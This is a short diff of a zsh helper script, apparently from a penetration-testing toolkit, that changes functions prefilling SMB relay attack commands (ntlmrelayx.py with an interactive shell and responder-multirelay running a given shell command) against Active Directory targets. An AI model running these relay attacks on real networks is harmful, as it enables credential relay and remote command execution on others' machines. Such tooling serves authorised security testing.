@@ -42,9 +42,9 @@ nb-ad-smb-relay-responder() {
 
 nb-ad-smb-relay-ntlmrelay-shell() {
 	__ask "Enter a targets list file"
-	__check-targets
+	local targets && __askvar targets TARGETS
 
-	print -z "sudo ntlmrelayx.py -tf ${__TARGETS} -smb2support -i"
+	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
@@ -60,5 +60,5 @@ nb-ad-smb-relay-multirelay-command() {
 	__ask "Enter a shell command to execute"
 	local command && __askvar command COMMAND
 
-	print -z "responder-multirelay -t ${__TARGETS} -c ${command} -u ALL"
+	print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL"
 }
